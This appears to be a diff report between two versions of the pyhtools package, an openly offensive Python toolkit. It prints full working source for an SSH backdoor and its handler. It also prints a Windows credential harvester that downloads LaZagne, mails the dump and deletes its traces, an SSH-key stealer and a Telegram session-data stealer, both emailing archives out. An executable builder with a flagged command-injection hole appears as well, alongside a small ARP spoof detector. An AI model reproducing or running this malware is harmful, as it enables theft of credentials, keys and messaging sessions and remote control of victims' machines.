+    login_details = None
+    if args.login_details is not None:
+        login_details = [detail.strip() for detail in args.login_details.split(',')]
+
+    ignore_links = None
+    if args.ignore_links is not None:
+        ignore_links = [link.strip() for link in args.ignore_links.split(',')]
+
+    return {
+        "target_url": target_url,
+        "ignore_links": ignore_links,
+        "login_link": login_link,
+        "login_details" : login_details,
+    }
+
+
+
+if __name__ == '__main__':
+    args = get_args()
+
+    TARGET_URL = args['target_url']
+    print(BRIGHT_YELLOW + '[*] TARGET URL: ', TARGET_URL)
+
+    IGNORE_LINKS = args['ignore_links']
+    print(BRIGHT_YELLOW + '[*] LINKS TO BE IGNORED: ', IGNORE_LINKS)
+
+    authentication_required = False
+    if args['login_details'] is not None and args['login_link'] is not None:
+        try:
+            LOGIN_LINK = args['login_link']
+            print(BRIGHT_YELLOW + '[*] LOGIN LINK: ', LOGIN_LINK)
+
+            USERNAME = args['login_details'][0]
+            print(BRIGHT_YELLOW +'[*] USERNAME: ', USERNAME)
+            
+            PASSWORD = args['login_details'][1]
+            print(BRIGHT_YELLOW + '[*] PASSWORD: ', PASSWORD)
+            
+            authentication_required = True
+        
+        except IndexError:
+            print(BRIGHT_RED + '[-] PLEASE PROVIDE ALL THE REQUIRED VALUES.')
+            print(BRIGHT_YELLOW + '[*] USE -h or --help for usage.')
+            sys.exit()
+
+    print()
+
+    vuln_scanner = scanner.Scanner(TARGET_URL, IGNORE_LINKS)
+    if authentication_required:
+        login_post_values = {"username":USERNAME, "password":PASSWORD, "Login":"submit"}
+        vuln_scanner.session.post(LOGIN_LINK, data=login_post_values)
     vuln_scanner.run()
```

### Comparing `pyhtools-2.2.1/pyhtools/detectors/arp_spoof_detector.py` & `pyhtools-2.2.2/pyhtools/detectors/arp_spoof_detector.py`

 * *Ordering differences only*

 * *Files 20% similar despite different names*

```diff
@@ -1,56 +1,56 @@
-import scapy.all as sp
-from argparse import ArgumentParser
-
-
-class SpoofDetector:
-    '''
-    ARP spoofer to perform Local MITM attacks
-    '''
-
-    def __init__(self, interface: str) -> None:
-        self.interface = interface
-
-    def get_mac(self, ip: str):
-        '''
-        returns mac address of the ip
-        '''
-        arp_req = sp.ARP(pdst=ip)
-        brdcst = sp.Ether(dst='ff:ff:ff:ff:ff:ff')
-
-        packet = brdcst / arp_req
-        responded_list = sp.srp(packet, timeout=1, verbose=False)[0]
-
-        return responded_list[0][1].hwsrc
-
-    def check_spoof(self, packet) -> bool:
-        '''
-        checks if machine is under ARP/MITM attack.
-        '''
-        if packet.haslayer(sp.ARP) and packet[sp.ARP].op == 2:
-            try:
-                real_mac = self.get_mac(packet[sp.ARP].psrc)
-                response_mac = packet[sp.ARP].hwsrc
-                if real_mac != response_mac:
-                    print(
-                        f"[!] ARP Spoof Detected! {response_mac} is imposter. {response_mac} is spoofing as {real_mac}")
-            except IndexError:
-                pass
-
-    def start(self):
-        '''
-        captures and processes packets to check whether network is being attacked or not
-        '''
-        sp.sniff(iface=self.interface, store=False, prn=self.check_spoof)
-
-
-if __name__ == '__main__':
-    parser = ArgumentParser()
-    parser.add_argument('-i', '--interface', dest='interface',
-                        help='checks for specific interface')
-
-    args = parser.parse_args()
-    interface = args.interface
-
-    # Create spoof detector obj and start process
-    detector = SpoofDetector(interface)
-    detector.start()
+import scapy.all as sp
+from argparse import ArgumentParser
+
+
+class SpoofDetector:
+    '''
+    ARP spoofer to perform Local MITM attacks
+    '''
+
+    def __init__(self, interface: str) -> None:
+        self.interface = interface
+
+    def get_mac(self, ip: str):
+        '''
+        returns mac address of the ip
+        '''
+        arp_req = sp.ARP(pdst=ip)
+        brdcst = sp.Ether(dst='ff:ff:ff:ff:ff:ff')
+
+        packet = brdcst / arp_req
+        responded_list = sp.srp(packet, timeout=1, verbose=False)[0]
+
+        return responded_list[0][1].hwsrc
+
+    def check_spoof(self, packet) -> bool:
+        '''
+        checks if machine is under ARP/MITM attack.
+        '''
+        if packet.haslayer(sp.ARP) and packet[sp.ARP].op == 2:
+            try:
+                real_mac = self.get_mac(packet[sp.ARP].psrc)
+                response_mac = packet[sp.ARP].hwsrc
+                if real_mac != response_mac:
+                    print(
+                        f"[!] ARP Spoof Detected! {response_mac} is imposter. {response_mac} is spoofing as {real_mac}")
+            except IndexError:
+                pass
+
+    def start(self):
+        '''
+        captures and processes packets to check whether network is being attacked or not
+        '''
+        sp.sniff(iface=self.interface, store=False, prn=self.check_spoof)
+
+
+if __name__ == '__main__':
+    parser = ArgumentParser()
+    parser.add_argument('-i', '--interface', dest='interface',
+                        help='checks for specific interface')
+
+    args = parser.parse_args()
+    interface = args.interface
+
+    # Create spoof detector obj and start process
+    detector = SpoofDetector(interface)
+    detector.start()
```

### Comparing `pyhtools-2.2.1/pyhtools/evil_files/exec_generator.py` & `pyhtools-2.2.2/pyhtools/evil_files/exec_generator.py`

 * *Ordering differences only*

 * *Files 17% similar despite different names*

```diff
@@ -1,78 +1,78 @@
-'''
-module: generator.py
-description: generates evil file executable
-'''
-from enum import Enum
-from subprocess import call
-from os import name as os_name
-
-
-class Compilers(Enum):
-    DEFAULT = 0
-    MINGW = 1
-    CLANG = 2
-
-
-class ExecutableGenerator:
-    '''
-    creates executable from python script.
-    '''
-
-    def __init__(self, file_path: str, output_dir: str = None, icon: str = None, compiler: Compilers = Compilers.DEFAULT, onefile: bool = True, remove_output: bool = True,) -> None:
-        # file options
-        self.__file = file_path
-
-        # set options
-        self.__options = {
-            'onefile': onefile,
-            'standalone': True,
-            'remove-output': remove_output,
-            'output-dir': output_dir,
-        }
-
-        # os based options
-        if os_name == 'nt':
-            self.__options['icon'] = icon
-        else:
-            icon = None
-
-        # compiler based options
-        if compiler == Compilers.CLANG:
-            self.__options['clang'] = True
-        elif compiler == Compilers.MINGW:
-            self.__options['mingw'] = True
-
-    def __generate_command(self):
-        '''
-        generates nuitka command
-        '''
-        if os_name == 'nt':
-            command = 'python -m nuitka '
-        else:
-            command = 'python3 -m nuitka '
-
-        for key in self.__options:
-            cmd = ''
-            value = self.__options[key]
-            value_type = type(self.__options[key])
-
-            # generate option
-            if value_type is bool and value:
-                cmd = f'--{key} '
-            elif value_type is str:
-                cmd = f'--{key}={value} '
-
-            # add option to command
-            command += cmd
-
-        # add file name and return
-        command += f'{self.__file}'
-        return command
-
-    def generate_executable(self):
-        # linux devices requires patchelf to be installed
-        # sudo apt install patchelf 
-        command = self.__generate_command()
-
-        # vuln: os command injection
-        return call(command, shell=True)
+'''
+module: generator.py
+description: generates evil file executable
+'''
+from enum import Enum
+from subprocess import call
+from os import name as os_name
+
+
+class Compilers(Enum):
+    DEFAULT = 0
+    MINGW = 1
+    CLANG = 2
+
+
+class ExecutableGenerator:
+    '''
+    creates executable from python script.
+    '''
+
+    def __init__(self, file_path: str, output_dir: str = None, icon: str = None, compiler: Compilers = Compilers.DEFAULT, onefile: bool = True, remove_output: bool = True,) -> None:
+        # file options
+        self.__file = file_path
+
+        # set options
+        self.__options = {
+            'onefile': onefile,
+            'standalone': True,
+            'remove-output': remove_output,
+            'output-dir': output_dir,
+        }
+
+        # os based options
+        if os_name == 'nt':
+            self.__options['icon'] = icon
+        else:
+            icon = None
+
+        # compiler based options
+        if compiler == Compilers.CLANG:
+            self.__options['clang'] = True
+        elif compiler == Compilers.MINGW:
+            self.__options['mingw'] = True
+
+    def __generate_command(self):
+        '''
+        generates nuitka command
+        '''
+        if os_name == 'nt':
+            command = 'python -m nuitka '
+        else:
+            command = 'python3 -m nuitka '
+
+        for key in self.__options:
+            cmd = ''
+            value = self.__options[key]
+            value_type = type(self.__options[key])
+
+            # generate option
+            if value_type is bool and value:
+                cmd = f'--{key} '
+            elif value_type is str:
+                cmd = f'--{key}={value} '
+
+            # add option to command
+            command += cmd
+
+        # add file name and return
+        command += f'{self.__file}'
+        return command
+
+    def generate_executable(self):
+        # linux devices requires patchelf to be installed
+        # sudo apt install patchelf 
+        command = self.__generate_command()
+
+        # vuln: os command injection
+        return call(command, shell=True)
```

### Comparing `pyhtools-2.2.1/pyhtools/evil_files/malwares/backdoor/ssh/backdoor.py` & `pyhtools-2.2.2/pyhtools/evil_files/malwares/backdoor/ssh/backdoor.py`

 * *Ordering differences only*

 * *Files 22% similar despite different names*

```diff
@@ -1,102 +1,102 @@
-import logging
-import os
-import paramiko
-import socket
-import threading
-import subprocess
-import shlex
-
-# configure logging
-logging.getLogger("paramiko").setLevel(logging.WARNING)
-logging.basicConfig(
-    level=logging.DEBUG,
-    format='[%(asctime)s] [%(levelname)s] - %(message)s'
-)
-
-
-class SSHbackdoor:
-    class Backdoor(paramiko.ServerInterface):
-        '''SSH backdoor handler'''
-
-        def __init__(self, username: str, passwd: str) -> None:
-            self._username = username
-            self._passwd = passwd
-            self.event = threading.Event()
-
-        def check_channel_request(self, kind: str, chanid: int) -> int:
-            if kind == 'session':
-                return paramiko.OPEN_SUCCEEDED
-            return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
-
-        def check_auth_password(self, username: str, password: str) -> int:
-            if (username == self._username) and (password == self._passwd):
-                return paramiko.AUTH_SUCCESSFUL
-            return paramiko.AUTH_FAILED
-
-    def __init__(self, username: str, passwd: str, host: str = '0.0.0.0', port=8022, rsa_key_path: str = None) -> None:
-        assert isinstance(username, str)
-        assert isinstance(passwd, str)
-        assert isinstance(host, str)
-        assert isinstance(port, int)
-        assert isinstance(rsa_key_path, str)
-        assert os.path.exists(rsa_key_path)  # file doesn't exist
-
-        self._username = username
-        self._passwd = passwd
-        self._host = host
-        self._port = port
-        self._rsa_key = paramiko.RSAKey(filename=rsa_key_path)
-
-    def start(self):
-        # try to bind socket address to the host
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            sock.bind((self._host, self._port))
-            logging.info(f'Listening on {self._host}:{self._port}')
-            sock.listen(100)
-            client, addr = sock.accept()
-        except Exception as e:
-            logging.error(f'Listen Failed: {e}')
-            return
-        else:
-            logging.info(f'Got connection: {addr}')
-
-        # create ssh
-        session = paramiko.Transport(client)
-        session.add_server_key(self._rsa_key)
-        server = self.Backdoor(self._username, self._passwd)
-        session.start_server(server=server)
-
-        channel = session.accept(20)
-        if channel is None:
-            return
-
-        logging.info('Handler Authenticated')
-
-        # send first message
-        channel.send('Backdoor is active')
-
-        while channel.active:
-            try:
-                cmd = channel.recv(1024).decode('utf-8')
-
-                # if cmd is exit then break the loop
-                if cmd == '!!exit':
-                    break
-
-                # execute command and return output to handler
-                else:
-                    output = subprocess.check_output(
-                        shlex.split(cmd),
-                        shell=True,
-                        stderr=subprocess.PIPE,
-                    )
-                    channel.send(output or '!!ok')
-
-            # send exception to handler
-            except Exception as e:
-                channel.send(f'Exception: {e}'.encode('utf-8'))
-                logging.error(e)
-
-        channel.close()
+import logging
+import os
+import paramiko
+import socket
+import threading
+import subprocess
+import shlex
+
+# configure logging
+logging.getLogger("paramiko").setLevel(logging.WARNING)
+logging.basicConfig(
+    level=logging.DEBUG,
+    format='[%(asctime)s] [%(levelname)s] - %(message)s'
+)
+
+
+class SSHbackdoor:
+    class Backdoor(paramiko.ServerInterface):
+        '''SSH backdoor handler'''
+
+        def __init__(self, username: str, passwd: str) -> None:
+            self._username = username
+            self._passwd = passwd
+            self.event = threading.Event()
+
+        def check_channel_request(self, kind: str, chanid: int) -> int:
+            if kind == 'session':
+                return paramiko.OPEN_SUCCEEDED
+            return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
+
+        def check_auth_password(self, username: str, password: str) -> int:
+            if (username == self._username) and (password == self._passwd):
+                return paramiko.AUTH_SUCCESSFUL
+            return paramiko.AUTH_FAILED
+
+    def __init__(self, username: str, passwd: str, host: str = '0.0.0.0', port=8022, rsa_key_path: str = None) -> None:
+        assert isinstance(username, str)
+        assert isinstance(passwd, str)
+        assert isinstance(host, str)
+        assert isinstance(port, int)
+        assert isinstance(rsa_key_path, str)
+        assert os.path.exists(rsa_key_path)  # file doesn't exist
+
+        self._username = username
+        self._passwd = passwd
+        self._host = host
+        self._port = port
+        self._rsa_key = paramiko.RSAKey(filename=rsa_key_path)
+
+    def start(self):
+        # try to bind socket address to the host
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.bind((self._host, self._port))
+            logging.info(f'Listening on {self._host}:{self._port}')
+            sock.listen(100)
+            client, addr = sock.accept()
+        except Exception as e:
+            logging.error(f'Listen Failed: {e}')
+            return
+        else:
+            logging.info(f'Got connection: {addr}')
+
+        # create ssh
+        session = paramiko.Transport(client)
+        session.add_server_key(self._rsa_key)
+        server = self.Backdoor(self._username, self._passwd)
+        session.start_server(server=server)
+
+        channel = session.accept(20)
+        if channel is None:
+            return
+
+        logging.info('Handler Authenticated')
+
+        # send first message
+        channel.send('Backdoor is active')
+
+        while channel.active:
+            try:
+                cmd = channel.recv(1024).decode('utf-8')
+
+                # if cmd is exit then break the loop
+                if cmd == '!!exit':
+                    break
+
+                # execute command and return output to handler
+                else:
+                    output = subprocess.check_output(
+                        shlex.split(cmd),
+                        shell=True,
+                        stderr=subprocess.PIPE,
+                    )
+                    channel.send(output or '!!ok')
+
+            # send exception to handler
+            except Exception as e:
+                channel.send(f'Exception: {e}'.encode('utf-8'))
+                logging.error(e)
+
+        channel.close()
```

### Comparing `pyhtools-2.2.1/pyhtools/evil_files/malwares/backdoor/ssh/handler.py` & `pyhtools-2.2.2/pyhtools/evil_files/malwares/backdoor/ssh/handler.py`

 * *Ordering differences only*

 * *Files 22% similar despite different names*

```diff
@@ -1,75 +1,75 @@
-import logging
-import paramiko
-
-
-logging.getLogger("paramiko").setLevel(logging.WARNING) 
-logging.basicConfig(
-    level=logging.DEBUG,
-    format='[%(asctime)s] [%(levelname)s] - %(message)s'
-)
-
-
-class SSHBackdoorHandler:
-    def __init__(self, ip: str, port: int, username: str, passwd: str) -> None:
-        # check if args are of valid type
-        assert isinstance(ip, str)
-        assert isinstance(port, int)
-        assert isinstance(username, str)
-        assert isinstance(passwd, str)
-
-        # create client
-        self._client = paramiko.SSHClient()
-        self._client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-        # connect to the client
-        self._client.connect(
-            hostname=ip,
-            port=port,
-            username=username,
-            password=passwd,
-        )
-
-    def __del__(self):
-        self._client.close()
-
-    def exec_command(self, cmd: str = None):
-        '''executes commands on ssh server and returns result'''
-        if not cmd:
-            cmd = 'whoami'
-
-        # execute command and return output as string
-        output = ''
-        stdin, stdout, stderr = self._client.exec_command(command=cmd)
-        output_list = stdout.readlines() + stderr.readlines()
-        if output_list:
-            output = '\n'.join([str(line).strip() for line in output_list])
-
-        return output
-
-    def interactive_mode(self):
-        '''for custom backdoor'''
-        # create ssh session
-        session = self._client.get_transport().open_session()
-        logging.info(f'Session Created')
-
-        # receive first message
-        print(session.recv(1024).decode("utf-8"))
-        
-        bad_chars_list = ['', '\r', '\r\n']
-        while session.active:
-            cmd = input(f'>> ').strip()
-
-            # avoid executing error generating characters
-            if cmd in bad_chars_list:
-                continue
-
-            # create exit command to exit the interactive mode
-            if cmd == '!!exit':
-                session.send('!!exit')
-                break
-            
-            session.send(cmd.encode('utf-8')) # encode command and send to backdoor
-            output = session.recv(1024).decode()
-            print(output)
-            
-        logging.info('Session Closed')
+import logging
+import paramiko
+
+
+logging.getLogger("paramiko").setLevel(logging.WARNING) 
+logging.basicConfig(
+    level=logging.DEBUG,
+    format='[%(asctime)s] [%(levelname)s] - %(message)s'
+)
+
+
+class SSHBackdoorHandler:
+    def __init__(self, ip: str, port: int, username: str, passwd: str) -> None:
+        # check if args are of valid type
+        assert isinstance(ip, str)
+        assert isinstance(port, int)
+        assert isinstance(username, str)
+        assert isinstance(passwd, str)
+
+        # create client
+        self._client = paramiko.SSHClient()
+        self._client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        # connect to the client
+        self._client.connect(
+            hostname=ip,
+            port=port,
+            username=username,
+            password=passwd,
+        )
+
+    def __del__(self):
+        self._client.close()
+
+    def exec_command(self, cmd: str = None):
+        '''executes commands on ssh server and returns result'''
+        if not cmd:
+            cmd = 'whoami'
+
+        # execute command and return output as string
+        output = ''
+        stdin, stdout, stderr = self._client.exec_command(command=cmd)
+        output_list = stdout.readlines() + stderr.readlines()
+        if output_list:
+            output = '\n'.join([str(line).strip() for line in output_list])
+
+        return output
+
+    def interactive_mode(self):
+        '''for custom backdoor'''
+        # create ssh session
+        session = self._client.get_transport().open_session()
+        logging.info(f'Session Created')
+
+        # receive first message
+        print(session.recv(1024).decode("utf-8"))
+        
+        bad_chars_list = ['', '\r', '\r\n']
+        while session.active:
+            cmd = input(f'>> ').strip()
+
+            # avoid executing error generating characters
+            if cmd in bad_chars_list:
+                continue
+
+            # create exit command to exit the interactive mode
+            if cmd == '!!exit':
+                session.send('!!exit')
+                break
+            
+            session.send(cmd.encode('utf-8')) # encode command and send to backdoor
+            output = session.recv(1024).decode()
+            print(output)
+            
+        logging.info('Session Closed')
```

### Comparing `pyhtools-2.2.1/pyhtools/evil_files/malwares/data_harvesters/credential_harvester.py` & `pyhtools-2.2.2/pyhtools/evil_files/malwares/data_harvesters/credential_harvester.py`

 * *Ordering differences only*

 * *Files 12% similar despite different names*

```diff
@@ -1,58 +1,58 @@
-'''
-module: credential_harvester.py
-description: get user credentials on Windows machine
-platform: Windows
-'''
-import os
-import tempfile
-import subprocess
-import zipfile
-from pyhtools.evil_files.malwares.utils import send_mail, download
-from shutil import rmtree
-
-
-class CredentialHarvester:
-    @staticmethod
-    def run(email: str, password: str, lazagne_download_link: str = r'https://github.com/AlessandroZ/LaZagne/releases/download/2.3.2/Windows.zip', smtp_server: str = 'smtp.gmail.com', smtp_port: int = 587):
-        '''
-        generates data report and sends email to self
-        '''
-        # change workding directory to tmp directory
-        tmp_dir = tempfile.gettempdir()
-        os.chdir(tmp_dir)
-
-        # get file and extracted directory names
-        file_name = lazagne_download_link.split('/')[-1]  # Windows.zip
-        extract_dir = file_name.split('.')[0]  # Windows
-
-        # download and unzip lazagne
-        download(lazagne_download_link)
-        with zipfile.ZipFile(file_name, 'r') as zip_file:
-            zip_file.extractall(tmp_dir)
-
-        # change to extracted directory (Windows)
-        os.chdir(extract_dir)
-
-        # generate reports
-        recovered_report = subprocess.call('laZagne_x86.exe all')
-        report = subprocess.check_output('lazagne.exe all -vv')
-        msg = f'Subject: Credential Harvester Report.\n\n{"-"*25}\n{report}\n{"-"*25}\n{recovered_report}'
-
-        # mail reports
-        send_mail(
-            email=email,
-            receiver_mail=email,
-            password=password,
-            message=msg,
-            smtp_server=smtp_server,
-            smtp_port=smtp_port,
-        )
-
-        # remove traces
-        os.chdir('..')
-        rmtree(extract_dir)
-        os.remove(file_name)
-
-
-if __name__ == '__main__':
-    CredentialHarvester.run('your_gmail', 'your_gmail_passwd')
+'''
+module: credential_harvester.py
+description: get user credentials on Windows machine
+platform: Windows
+'''
+import os
+import tempfile
+import subprocess
+import zipfile
+from pyhtools.evil_files.malwares.utils import send_mail, download
+from shutil import rmtree
+
+
+class CredentialHarvester:
+    @staticmethod
+    def run(email: str, password: str, lazagne_download_link: str = r'https://github.com/AlessandroZ/LaZagne/releases/download/2.3.2/Windows.zip', smtp_server: str = 'smtp.gmail.com', smtp_port: int = 587):
+        '''
+        generates data report and sends email to self
+        '''
+        # change workding directory to tmp directory
+        tmp_dir = tempfile.gettempdir()
+        os.chdir(tmp_dir)
+
+        # get file and extracted directory names
+        file_name = lazagne_download_link.split('/')[-1]  # Windows.zip
+        extract_dir = file_name.split('.')[0]  # Windows
+
+        # download and unzip lazagne
+        download(lazagne_download_link)
+        with zipfile.ZipFile(file_name, 'r') as zip_file:
+            zip_file.extractall(tmp_dir)
+
+        # change to extracted directory (Windows)
+        os.chdir(extract_dir)
+
+        # generate reports
+        recovered_report = subprocess.call('laZagne_x86.exe all')
+        report = subprocess.check_output('lazagne.exe all -vv')
+        msg = f'Subject: Credential Harvester Report.\n\n{"-"*25}\n{report}\n{"-"*25}\n{recovered_report}'
+
+        # mail reports
+        send_mail(
+            email=email,
+            receiver_mail=email,
+            password=password,
+            message=msg,
+            smtp_server=smtp_server,
+            smtp_port=smtp_port,
+        )
+
+        # remove traces
+        os.chdir('..')
+        rmtree(extract_dir)
+        os.remove(file_name)
+
+
+if __name__ == '__main__':
+    CredentialHarvester.run('your_gmail', 'your_gmail_passwd')
```

### Comparing `pyhtools-2.2.1/pyhtools/evil_files/malwares/data_harvesters/ssh_cred_harvester.py` & `pyhtools-2.2.2/pyhtools/evil_files/malwares/data_harvesters/ssh_cred_harvester.py`

 * *Ordering differences only*

 * *Files 16% similar despite different names*

```diff
@@ -1,49 +1,49 @@
-from pyhtools.evil_files.malwares.utils import send_mail, create_zip
-from tempfile import gettempdir
-from os.path import join as path_join, expanduser, exists as is_exists
-from os import chdir, getcwd, remove
-from shutil import make_archive
-from datetime import datetime
-
-
-class SSHarvester:
-    def __init__(self, sender_email: str, sender_passwd: str, server: str = "smtp.gmail.com", port: int = 587, receivers: list[str] = None) -> None:
-        # email configurations
-        self.sender_email = sender_email
-        self.sender_passwd = sender_passwd
-        self.server = server
-        self.port = port
-        self.receivers = receivers
-
-    def harvest(self):
-        cwd = getcwd()
-        temp_path = gettempdir()
-
-        ssh_path = path_join(expanduser(), '.ssh')
-        chdir(ssh_path)
-
-        if not is_exists(ssh_path):
-            return False
-
-        message = f'''
-        -------------------------------
-        PyHTools SSH Harvester
-        -------------------------------
-        SSH Directory Path: {ssh_path}
-
-        PyHTools: https://github.com/dmdhrumilmistry/pyhtools
-        '''
-
-        # create zip file payload
-        zip_name = f'ssh-keys-{datetime.now().strftime("%m-%d-%Y_%H-%M-%S")}.zip'
-        make_archive(zip_name, 'zip', temp_path, ssh_path)
-        zip_path = path_join(temp_path, zip_name)
-
-        status = send_mail(email=self.sender_email, receiver_mails=self.receivers, password=self.sender_passwd,
-                  smtp_server=self.server, smtp_port=self.port, zip_file_path=zip_path)
-
-        chdir(temp_path)
-        remove(zip_path)
-        chdir(cwd)
-
-        return status
+from pyhtools.evil_files.malwares.utils import send_mail, create_zip
+from tempfile import gettempdir
+from os.path import join as path_join, expanduser, exists as is_exists
+from os import chdir, getcwd, remove
+from shutil import make_archive
+from datetime import datetime
+
+
+class SSHarvester:
+    def __init__(self, sender_email: str, sender_passwd: str, server: str = "smtp.gmail.com", port: int = 587, receivers: list[str] = None) -> None:
+        # email configurations
+        self.sender_email = sender_email
+        self.sender_passwd = sender_passwd
+        self.server = server
+        self.port = port
+        self.receivers = receivers
+
+    def harvest(self):
+        cwd = getcwd()
+        temp_path = gettempdir()
+
+        ssh_path = path_join(expanduser(), '.ssh')
+        chdir(ssh_path)
+
+        if not is_exists(ssh_path):
+            return False
+
+        message = f'''
+        -------------------------------
+        PyHTools SSH Harvester
+        -------------------------------
+        SSH Directory Path: {ssh_path}
+
+        PyHTools: https://github.com/dmdhrumilmistry/pyhtools
+        '''
+
+        # create zip file payload
+        zip_name = f'ssh-keys-{datetime.now().strftime("%m-%d-%Y_%H-%M-%S")}.zip'
+        make_archive(zip_name, 'zip', temp_path, ssh_path)
+        zip_path = path_join(temp_path, zip_name)
+
+        status = send_mail(email=self.sender_email, receiver_mails=self.receivers, password=self.sender_passwd,
+                  smtp_server=self.server, smtp_port=self.port, zip_file_path=zip_path)
+
+        chdir(temp_path)
+        remove(zip_path)
+        chdir(cwd)
+
+        return status
```

### Comparing `pyhtools-2.2.1/pyhtools/evil_files/malwares/data_harvesters/telegram_data_harvester.py` & `pyhtools-2.2.2/pyhtools/evil_files/malwares/data_harvesters/telegram_data_harvester.py`

 * *Ordering differences only*

 * *Files 14% similar despite different names*

```diff
@@ -1,145 +1,145 @@
-import time
-import os
-import psutil
-import shutil
-import smtplib
-import tempfile
-import subprocess
-from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-from email import encoders
-
-
-class TelegramHarvester:
-    def __init__(self, sender_email: str, sender_passwd: str, server: str = "smtp.gmail.com", port: int = 587, receivers: list[str] = None):
-        # move current location to temp directory
-        self.temp_path = tempfile.gettempdir()
-        os.chdir(self.temp_path)
-
-        # create list to save tdata paths found
-        self.tdata_paths = []
-
-        # email configurations
-        self.sender_email = sender_email
-        self.sender_passwd = sender_passwd
-        self.server = server
-        self.port = port
-        self.receivers = receivers
-
-    def find_tdata_in(self, path):
-        '''
-        description: find tdata in specific location
-        '''
-        tdata_path = None
-        for root, dirs, files in os.walk(path):
-            for dir in dirs:
-                if 'telegram' in dir.lower():
-                    telegram_path = os.path.join(root, dir)
-
-                    tdata_path = os.path.join(telegram_path, 'tdata')
-                    if os.path.isdir(tdata_path) and tdata_path not in self.tdata_paths:
-                        self.tdata_paths.append(tdata_path)
-
-    def terminate_td(self):
-        '''
-        description: kills Telegram processes if running
-        '''
-        if os.name == 'nt':
-            import wmi
-            f = wmi.WMI()
-            for process in f.Win32_Process():
-                if 'telegram' in process.name.lower():
-                    process.Terminate()
-        else:
-            processes = subprocess.Popen(
-                'ps -A', shell=True, stdout=subprocess.PIPE)
-            output, error = processes.communicate()
-
-            for line in output.splitlines():
-                if 'telegram' in str(line).lower():
-                    pid = int(line.split(None, 1)[0])
-                    os.kill(pid, 9)
-
-    def send_zip(self, zip_path):
-        '''
-        description: report tdata zip to the attacker
-        '''
-        try:
-            DESTINATION_ARCHIVE_NAME = zip_path
-            SUBJECT = "Telegram Data {}".format(zip_path)
-
-            # separate emails using comma
-            RECIPIENTS = ','.join(self.receivers)
-
-            msg = MIMEMultipart()
-            msg['Subject'] = SUBJECT
-            msg['From'] = self.sender_email
-            msg['To'] = RECIPIENTS
-
-            part = MIMEBase("application", "octet-stream")
-            part.set_payload(open(DESTINATION_ARCHIVE_NAME, "rb").read())
-            encoders.encode_base64(part)
-            part.add_header("Content-Disposition",
-                            "attachment; filename=\"%s\"" % (DESTINATION_ARCHIVE_NAME))
-            msg.attach(part)
-
-            smtp = smtplib.SMTP(self.server, self.port)
-            smtp.ehlo()
-            smtp.starttls()
-            smtp.ehlo()
-            smtp.login(self.sender_email, self.sender_passwd)
-            smtp.sendmail(self.sender_email, RECIPIENTS, msg.as_string())
-            smtp.close()
-
-            return True
-
-        except Exception as e:
-            # ignore any exceptions occurred
-            return False
-
-    def create_archive_and_send_mail(self, source_path: str, dest_path: str):
-        '''
-        desciption: creates archive and send email 
-        '''
-        os.chdir(dest_path)
-        self.terminate_td()
-        zip_name = 'tdata_zip_file_{}'.format(time.time())
-        shutil.make_archive(zip_name, 'zip', dest_path, source_path)
-        zip_path = os.path.join(dest_path, zip_name + '.zip')
-        self.send_zip(zip_path)
-        os.chdir(dest_path)
-        os.remove(zip_path)
-
-    def search_in_paritions(self,):
-        '''
-        description: search for telegram data in mounted partitions
-        '''
-        partitions = psutil.disk_partitions()
-        for partition in partitions:
-            self.find_tdata_in(partition.mountpoint)
-
-    def start(self):
-        # target os specific locations to search for tdata
-        if os.name == 'nt':
-            probable_installation_paths = [
-                os.environ['APPDATA'],
-                os.environ['ALLUSERSPROFILE'],
-                os.environ['LOCALAPPDATA'],
-                os.environ['PROGRAMW6432'],
-                os.environ['PROGRAMFILES(X86)'],
-            ]
-
-        else:
-            probable_installation_paths = [
-                os.environ['HOME'],
-            ]
-
-        # first search in probable installation locations
-        for path in probable_installation_paths:
-            self.find_tdata_in(path)
-
-        self.terminate_td()
-        self.search_in_paritions()
-        for tpath in self.tdata_paths:
-            self.create_archive_and_send_mail(
-                source_path=tpath, dest_path=self.temp_path)
+import time
+import os
+import psutil
+import shutil
+import smtplib
+import tempfile
+import subprocess
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+
+
+class TelegramHarvester:
+    def __init__(self, sender_email: str, sender_passwd: str, server: str = "smtp.gmail.com", port: int = 587, receivers: list[str] = None):
+        # move current location to temp directory
+        self.temp_path = tempfile.gettempdir()
+        os.chdir(self.temp_path)
+
+        # create list to save tdata paths found
+        self.tdata_paths = []
+
+        # email configurations
+        self.sender_email = sender_email
+        self.sender_passwd = sender_passwd
+        self.server = server
+        self.port = port
+        self.receivers = receivers
+
+    def find_tdata_in(self, path):
+        '''
+        description: find tdata in specific location
+        '''
+        tdata_path = None
+        for root, dirs, files in os.walk(path):
+            for dir in dirs:
+                if 'telegram' in dir.lower():
+                    telegram_path = os.path.join(root, dir)
+
+                    tdata_path = os.path.join(telegram_path, 'tdata')
+                    if os.path.isdir(tdata_path) and tdata_path not in self.tdata_paths:
+                        self.tdata_paths.append(tdata_path)
+
+    def terminate_td(self):
+        '''
+        description: kills Telegram processes if running
+        '''
+        if os.name == 'nt':
+            import wmi
+            f = wmi.WMI()
+            for process in f.Win32_Process():
+                if 'telegram' in process.name.lower():
+                    process.Terminate()
+        else:
+            processes = subprocess.Popen(
+                'ps -A', shell=True, stdout=subprocess.PIPE)
+            output, error = processes.communicate()
+
+            for line in output.splitlines():
+                if 'telegram' in str(line).lower():
+                    pid = int(line.split(None, 1)[0])
+                    os.kill(pid, 9)
+
+    def send_zip(self, zip_path):
+        '''
+        description: report tdata zip to the attacker
+        '''
+        try:
+            DESTINATION_ARCHIVE_NAME = zip_path
+            SUBJECT = "Telegram Data {}".format(zip_path)
+
+            # separate emails using comma
+            RECIPIENTS = ','.join(self.receivers)
+
+            msg = MIMEMultipart()
+            msg['Subject'] = SUBJECT
+            msg['From'] = self.sender_email
+            msg['To'] = RECIPIENTS
+
+            part = MIMEBase("application", "octet-stream")
+            part.set_payload(open(DESTINATION_ARCHIVE_NAME, "rb").read())
+            encoders.encode_base64(part)
+            part.add_header("Content-Disposition",
